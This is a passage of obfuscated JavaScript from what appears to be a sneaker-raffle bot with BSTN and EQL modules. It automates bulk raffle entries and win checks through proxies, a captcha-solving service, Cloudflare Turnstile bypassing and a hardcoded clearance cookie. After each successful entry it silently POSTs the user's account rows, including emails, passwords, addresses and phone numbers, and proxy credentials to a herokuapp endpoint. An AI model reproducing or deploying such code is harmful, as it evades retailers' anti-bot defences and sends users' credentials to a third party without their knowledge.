                                _0xb396f == 'yes' && _0x5c7d70 >= 0x5 && (_0xb396f = 'no', _0x5c7d70 = 0x0), _0xa80cbb--, console['log'](_0x2bc944() + '\x20[' + _0x3230ee['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                            }
                        }
                        if (_0x13efe8 == _0x5f5738['length'] - 0x1) {
                            await _0x301387(_0x27453c, _0x5f5738, _0x4a38a0, _0x13efe8, 0x0);
                            return;
                        }
                        _0x301387(_0x27453c, _0x5f5738, _0x4a38a0, _0x13efe8, 0x0), await _0x63aa6a(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x217293, _0x53bc9a, _0x4d56ba) {
                    var _0xd44a8f = 0x0, _0x2462ed = _0x53bc9a;
                    for (var _0x26b9b4 = 0x0; _0x26b9b4 < _0x53bc9a['length']; _0x26b9b4++) {
                        maxTasks = Number(_0x2ab3b9['threads']);
                        while (_0xd44a8f >= maxTasks) {
                            await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                        let _0x252d7c = ![];
                        async function _0x1b3b48(_0x3f0948, _0x2d667d, _0xec48c6, _0x31c0a3, _0x4429cc) {
                            _0xd44a8f++, _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2ab3b9['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x8f7f0e, _0x4dae76 = _0x2d667d[_0x31c0a3];
                            try {
                                await _0x5921e0(_0x2d667d, _0x31c0a3);
                            } catch {
                                _0x39a811 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x94643e(_0x2235f0) {
                                const _0x17baa8 = _0x25647b['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2993bf = _0x20cf77['parse'](_0x17baa8, { 'header': !![] })['data'];
                                let _0x3c07a9 = ![];
                                for (var _0x34bf76 of _0x2993bf) {
                                    if (_0x34bf76['Url'] == _0x2235f0['Url'] && _0x34bf76['Email'] == _0x2235f0['Email']) {
                                        _0x3c07a9 = !![];
                                        break;
                                    }
                                }
                                return _0x3c07a9;
                            }
                            _0x9474bc(_0x3f0948['name'] + '\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20/\x20' + _0x2d667d['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                            var _0x5f2cc1 = Math['round'](Math['random']() * (_0xec48c6['length'] - 0x1)), _0x3be8ec = _0xec48c6[_0x5f2cc1]['split'](':'), _0xabc58e;
                            let _0x278d26 = ![], _0x39a811 = 'no';
                            try {
                                if (await _0x94643e(_0x2d667d[_0x31c0a3]) == !![]) {
                                    console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x278d26 = !![], _0x252d7c = !![];
                                    return;
                                }
                                try {
                                    _0xabc58e = await _0x555941['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3be8ec[0x0] + ':' + _0x3be8ec[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0xabc58e = await _0x555941['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3be8ec[0x0] + ':' + _0x3be8ec[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x25168c = await _0xabc58e['newPage'](), _0x3d8cce = await _0x25168c['target']()['createCDPSession'](), { windowId: _0x254b76 } = await _0x3d8cce['send']('Browser.getWindowForTarget');
                                await _0x25168c['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x5e357c = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x25168c['authenticate']({
                                    'username': '' + _0x3be8ec[0x2],
                                    'password': '' + _0x3be8ec[0x3]
                                }), console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x25168c['goto']('' + _0x2d667d[_0x31c0a3]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x63aa6a(0x1388);
                                var _0x1020b1 = await _0x25168c['$']('#turnstile-wrapper');
                                if (_0x1020b1) {
                                    console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x63aa6a(0x2710);
                                    const _0x4a2449 = await _0x25168c['$']('#turnstile-wrapper');
                                    if (_0x4a2449)
                                        try {
                                            await _0x4a2449['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x25168c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x2b8c7c = await _0x25168c['$']('#turnstile-wrapper');
                                        if (_0x2b8c7c)
                                            try {
                                                await _0x2b8c7c['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x25168c['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x3d8cce['send']('Browser.setWindowBounds', {
                                    'windowId': _0x254b76,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x63aa6a(0x1388), await _0x25168c['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x25168c['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Logging\x20in'), await _0x25168c['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1e0774 => _0x1e0774['click']()), await _0x25168c['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x25168c['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x63aa6a(0x7d0), await _0x25168c['waitForSelector']('#email-login'), await _0x25168c['type']('#email-login', '' + _0x2d667d[_0x31c0a3]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x63aa6a(0xdac), await _0x25168c['waitForSelector']('#password'), await _0x25168c['type']('#password', '' + _0x2d667d[_0x31c0a3]['Password'], { 'delay': 0xe6 }), await _0x63aa6a(0x157c);
                                try {
                                    await _0x25168c['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x36bce4 => _0x36bce4['click']());
                                } catch {
                                }
                                try {
                                    await _0x25168c['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0xa9b282) {
                                }
                                await _0x63aa6a(0x3e8);
                                const _0xd696b2 = await _0x25168c['$']('.enteredDraw_container__2KmQ_');
                                if (_0xd696b2) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2d667d[_0x31c0a3]['Size']);
                                try {
                                    if (_0x2d667d[_0x31c0a3]['Size'] != 'RANDOM') {
                                        var _0x2f6678 = _0x2d667d[_0x31c0a3]['Size']['replace']('.', ',');
                                        const _0x403ea3 = await _0x25168c['$x']('//div[contains(text(),\x20\x27' + _0x2f6678 + '\x27)]');
                                        await _0x403ea3[0x0]['click']();
                                    } else {
                                        const _0x3f4509 = await _0x25168c['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x895d28 = Math['round'](Math['random']() * (_0x3f4509['length'] - 0x1));
                                        await _0x3f4509[_0x895d28]['click']();
                                    }
                                } catch (_0x42e75a) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x63aa6a(0x1f4);
                                const _0x16db83 = await _0x25168c['$']('.addressList_addressItem__LE2PB');
                                if (_0x16db83 && _0x2d667d[_0x31c0a3]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x25168c['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x63aa6a(0x5dc), await _0x25168c['waitForSelector']('#firstname'), await _0x25168c['type']('#firstname', '' + _0x2d667d[_0x31c0a3]['FirstName']), await _0x63aa6a(0x1f4), await _0x25168c['waitForSelector']('#firstname'), await _0x25168c['type']('#lastname', '' + _0x2d667d[_0x31c0a3]['LastName']), await _0x63aa6a(0x1f4), await _0x25168c['waitForSelector']('#firstname'), await _0x25168c['type']('#street', '' + _0x2d667d[_0x31c0a3]['Address1']), await _0x63aa6a(0x1f4), await _0x25168c['waitForSelector']('#firstname'), await _0x25168c['type']('#houseNumber', _0x2d667d[_0x31c0a3]['HouseNumber'] + '\x20' + _0x2d667d[_0x31c0a3]['Address2']), await _0x63aa6a(0x1f4), await _0x25168c['waitForSelector']('#firstname'), await _0x25168c['select']('#country_code', '' + _0x2d667d[_0x31c0a3]['Country']), await _0x63aa6a(0x1f4), await _0x25168c['type']('#postcode', '' + _0x2d667d[_0x31c0a3]['Zip']), await _0x63aa6a(0x1f4), await _0x25168c['type']('#city', '' + _0x2d667d[_0x31c0a3]['City']), await _0x63aa6a(0x1f4), await _0x25168c['type']('#telephone', '' + _0x2d667d[_0x31c0a3]['Phone']), await _0x63aa6a(0x1f4), await _0x25168c['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x63aa6a(0x9c4);
                                try {
                                    await _0x25168c['type']('#instagram_name', '' + _0x2d667d[_0x31c0a3]['Follower']), await _0x25168c['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x63aa6a(0x5dc);
                                try {
                                    await _0x25168c['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x63aa6a(0x5dc), await _0x25168c['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4b93fc => _0x4b93fc['click']()), await _0x63aa6a(0x1388);
                                try {
                                    await _0x25168c['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x25168c['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x2d667d[_0x31c0a3]['Size'] != 'RANDOM') {
                                        var _0x2f6678 = _0x2d667d[_0x31c0a3]['Size']['replace']('.', ',');
                                        const _0x42de72 = await _0x25168c['$x']('//div[contains(text(),\x20' + _0x2f6678 + ')]');
                                        await _0x42de72[0x0]['click']();
                                    } else {
                                        const _0x2f8bdc = await _0x25168c['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x895d28 = Math['round'](Math['random']() * (_0x2f8bdc['length'] - 0x1));
                                        await _0x2f8bdc[_0x895d28]['click']();
                                    }
                                    await _0x63aa6a(0x5dc);
                                    try {
                                        await _0x25168c['hover']('#instagram_name'), await _0x25168c['type']('#instagram_name', '' + _0x2d667d[_0x31c0a3]['Follower']), await _0x25168c['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4429cc + '\x20/\x205)');
                                    try {
                                        await _0x25168c['hover']('.checkBox_boxHolder__wLGVe'), await _0x63aa6a(0x5dc), await _0x25168c['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x63aa6a(0x157c), await _0x25168c['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x50343e => _0x50343e['click']()), await _0x63aa6a(0x1388), await _0x25168c['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x39a811 = 'no', _0x1ab0d7(_0x2d667d[_0x31c0a3], _0x3f0948);
                                try {
                                    prxdata = {
                                        'username': _0x484f45['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x1bfb13),
                                        'proxy': '' + _0xec48c6[_0x31c0a3]
                                    };
                                    var _0x55f49e = JSON['stringify'](prxdata);
                                    let _0x498dc4 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x55f49e, _0x498dc4);
                                } catch (_0x2cf9dc) {
                                }
                                console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xa3a01a = await _0x198507(_0x2d667d[_0x31c0a3], _0x3f0948, 'dev', ![]), _0x1cc57f = await _0x198507(_0x2d667d[_0x31c0a3], _0x3f0948, 'pub', ![]);
                                const _0x302736 = {
                                    'succesDEVMSG': { 'embeds': [_0xa3a01a] },
                                    'succesPUBMSG': { 'embeds': [_0x1cc57f] }
                                };
                                let _0x1bfb13 = _0x2d667d[_0x31c0a3];
                                try {
                                    prxdata = {
                                        'username': _0x484f45['replace']('#', ''),
                                        'module': _0x3f0948['name'],
                                        'entrydata': JSON['stringify'](_0x1bfb13),
                                        'proxy': '' + _0xec48c6[_0x31c0a3]
                                    };
                                    var _0x55f49e = JSON['stringify'](prxdata);
                                    let _0x2baa49 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x55f49e, _0x2baa49);
                                } catch (_0x47f32c) {
                                }
                                try {
                                    _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x302736['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x302736['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x302736['succesPUBMSG']);
                                } catch (_0x3e51cf) {
                                    console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3e51cf));
                                }
                            } catch (_0x47aaad) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20' + _0x47aaad)), _0x39a811 = 'yes', _0x8f7f0e = '' + _0x47aaad;
                                var _0x2e75e3 = await _0x198507(_0x2d667d[_0x31c0a3], _0x3f0948, 'dev', !![], _0x8f7f0e), _0xa3a01a = await _0x198507(_0x2d667d[_0x31c0a3], _0x3f0948, 'dev', ![]), _0x1cc57f = await _0x198507(_0x2d667d[_0x31c0a3], _0x3f0948, 'pub', ![]);
                                const _0x3b7a55 = {
                                    'succesDEVMSG': { 'embeds': [_0xa3a01a] },
                                    'succesPUBMSG': { 'embeds': [_0x1cc57f] }
                                };
                                _0x3b7a55['errorDEV'] = { 'embeds': [_0x2e75e3] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x3b7a55['errorDEV']), await _0x56185b(_0x3c02fa, _0x3b7a55['errorDEV']);
                            } finally {
                                _0xabc58e && _0xabc58e['close']();
                                if (_0x39a811 == 'yes' && _0x4429cc != 0x5)
                                    return console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Task\x20' + (_0x31c0a3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4429cc + '\x20/\x205)')), _0x4429cc = _0x4429cc + 0x1, _0xd44a8f--, _0x1b3b48(_0x3f0948, _0x2d667d, _0xec48c6, _0x31c0a3, _0x4429cc);
                                _0x39a811 == 'yes' && _0x4429cc >= 0x5 && _0x11ea8b(_0x2d667d[_0x31c0a3], _0x3f0948), !_0x278d26 && (console['log'](_0x2bc944() + '\x20[' + _0x3f0948['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay'])), _0xd44a8f--;
                            }
                        }
                        _0x1b3b48(_0x217293, _0x2462ed, _0x4d56ba, _0x26b9b4, 0x0), await _0x63aa6a(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5208ab, _0xa677b9) {
                    var _0x181cdd = 0x0, _0x4f4cf4;
                    try {
                        const _0x51aef0 = _0x25647b['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x4f4cf4 = _0x20cf77['parse'](_0x51aef0, { 'header': !![] })['data'];
                    } catch (_0x17d79c) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x53f69c = 0x0; _0x53f69c < _0x4f4cf4['length']; _0x53f69c++) {
                        maxTasks = Number(_0x2ab3b9['threads']);
                        while (_0x181cdd >= maxTasks) {
                            await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                        async function _0x21d7e6(_0x120d7b, _0x4c17ee, _0x4e66da, _0x26d71c, _0x1c41a5) {
                            _0x181cdd++, _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2ab3b9['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x144bf4 != 'yes')
                                var _0x144bf4 = '', _0x1c41a5 = 0x0;
                            var _0x5bd001;
                            _0x9474bc(_0x120d7b['name'] + '\x20Task\x20' + (_0x26d71c + 0x1) + '\x20/\x20' + _0x4e66da['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                            var _0x329c7c = await _0x198507(_0x4e66da[_0x26d71c], _0x120d7b, 'acc', ![]);
                            const _0x49aded = { 'succesDEVMSG': { 'embeds': [_0x329c7c] } }, _0x1aa69d = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x440ac4 = Math['round'](Math['random']() * (_0x4c17ee['length'] - 0x1)), _0x13c120 = _0x4c17ee[_0x440ac4]['split'](':'), _0x253b5;
                            try {
                                _0x253b5 = await _0x555941['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x13c120[0x0] + ':' + _0x13c120[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x253b5 = await _0x555941['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x13c120[0x0] + ':' + _0x13c120[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20Checking\x20' + _0x4e66da[_0x26d71c]['Email']);
                                const _0x100de5 = await _0x253b5['newPage']();
                                await _0x100de5['authenticate']({
                                    'username': '' + _0x13c120[0x2],
                                    'password': '' + _0x13c120[0x3]
                                }), console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x100de5['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x100de5['setRequestInterception'](!![]), _0x100de5['on']('request', _0xc6f83a => {
                                    _0xc6f83a['resourceType']() === 'image' ? _0xc6f83a['abort']() : _0xc6f83a['continue']();
                                });
                                try {
                                    await _0x100de5['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x100de5['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x144bf4 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x100de5['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x63aa6a(0x3e8), await _0x100de5['type']('#email', _0x4e66da[_0x26d71c]['Email']), await _0x63aa6a(0x1f4), await _0x100de5['type']('#pass', _0x4e66da[_0x26d71c]['Password']), await _0x63aa6a(0x1f4), await _0x100de5['$eval']('#login-form', _0x551ab4 => _0x551ab4['submit']());
                                try {
                                    await _0x100de5['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x63aa6a(0x190);
                                const _0x3e7ed4 = await _0x100de5['evaluate'](() => {
                                    const _0x333bdb = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x333bdb['map'](_0x227899 => _0x227899['alt']);
                                }), _0x1e74c0 = await _0x100de5['evaluate'](() => {
                                    const _0x4f1073 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x4f1073['map'](_0x2aa2a8 => _0x2aa2a8['innerHTML']);
                                }), _0x486310 = await _0x100de5['$$']('.raffle-winner');
                                if (_0x486310['length'] < 0x1) {
                                    console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x144bf4 = 'no';
                                    return;
                                }
                                console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20' + _0x486310['length'] + '\x20Wins\x20Found!');
                                for (var _0x5c9bf5 = 0x0; _0x5c9bf5 < _0x486310['length']; _0x5c9bf5++) {
                                    console['log'](_0x49a6ed['green'](_0x3e7ed4[_0x5c9bf5] + _0x1e74c0[_0x5c9bf5]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x15d623) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20' + _0x15d623)), _0x5bd001 = '' + _0x15d623;
                                var _0x57dcc4 = await _0x198507(_0x4e66da[_0x26d71c], _0x120d7b, 'acc', !![], _0x5bd001);
                                _0x49aded['errorDEV'] = { 'embeds': [_0x57dcc4] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x49aded['errorDEV']), await _0x56185b(_0x3c02fa, _0x49aded['errorDEV']), _0x144bf4 = 'yes';
                            } finally {
                                if (_0x253b5)
                                    _0x253b5['close']();
                                if (_0x144bf4 == 'yes' && _0x1c41a5 != 0x5)
                                    return console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Task\x20' + (_0x26d71c + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c41a5 + '\x20/\x205)')), _0x181cdd--, _0x1c41a5 = _0x1c41a5 + 0x1, _0x21d7e6(_0x120d7b, _0x4c17ee, _0x4e66da, _0x26d71c, _0x1c41a5);
                                _0x144bf4 == 'yes' && _0x1c41a5 >= 0x5 && (_0x11ea8b(_0x4e66da[_0x26d71c], _0x120d7b), _0x144bf4 = 'no', _0x1c41a5 = 0x0), console['log'](_0x2bc944() + '\x20[' + _0x120d7b['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']), _0x181cdd--;
                            }
                        }
                        _0x21d7e6(_0x5208ab, _0xa677b9, _0x4f4cf4, _0x53f69c, 0x0), await _0x63aa6a(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x3aba06, _0x29ff89, _0x23f4e6) {
                _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2ab3b9['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x42cea6 = 0x0; _0x42cea6 < _0x29ff89['length']; _0x42cea6++) {
                    var _0x4db9da;
                    _0x9474bc(_0x3aba06['name'] + '\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20/\x20' + _0x29ff89['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                    try {
                        await _0x5921e0(_0x29ff89, _0x42cea6);
                    } catch {
                        _0x263870 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x515c5c(_0x59bc12) {
                        const _0x38cc5c = _0x25647b['readFileSync']('../successful-tasks.csv', 'utf8'), _0x862dae = _0x20cf77['parse'](_0x38cc5c, { 'header': !![] })['data'];
                        let _0x336958 = ![];
                        for (var _0x25c9bc of _0x862dae) {
                            if (_0x25c9bc['Url'] == _0x59bc12['Url'] && _0x25c9bc['Email'] == _0x59bc12['Email']) {
                                _0x336958 = !![];
                                break;
                            }
                        }
                        return _0x336958;
                    }
                    if (await _0x515c5c(_0x29ff89[_0x42cea6]) == !![]) {
                        console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x327440 = ![];
                    const _0x532756 = _0x25647b['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x270c38 = _0x20cf77['parse'](_0x532756, { 'header': !![] })['data'];
                    for (var _0x10ac75 of _0x270c38) {
                        _0x10ac75['Email'] == _0x29ff89[_0x42cea6]['Email'] && (_0x327440 = !![]);
                    }
                    if (_0x327440 == ![]) {
                        var _0xbf232;
                        if (_0x29ff89[_0x42cea6]['Url']['endsWith']('/')) {
                            _0xbf232 = _0x29ff89[_0x42cea6]['Url'] + 'register';
                            if (_0x263870 != 'yes')
                                var _0x263870 = '', _0x551eae = 0x0;
                        } else {
                            _0xbf232 = _0x29ff89[_0x42cea6]['Url'] + '/register';
                            if (_0x263870 != 'yes')
                                var _0x263870 = '', _0x551eae = 0x0;
                        }
                        if (_0x29ff89[_0x42cea6]['Email'] == '' || _0x29ff89[_0x42cea6]['FirstName'] == '' || _0x29ff89[_0x42cea6]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x29ff89[_0x42cea6]['Password'] == '' && (_0x29ff89[_0x42cea6]['Password'] = 'JRaffles23!');
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x366995 = _0x23f4e6[_0x42cea6]['split'](':');
                        else
                            var _0x3a1508 = Math['round'](Math['random']() * (_0x23f4e6['length'] - 0x1)), _0x366995 = _0x23f4e6[_0x3a1508]['split'](':');
                        var _0xc9d639;
                        try {
                            _0xc9d639 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
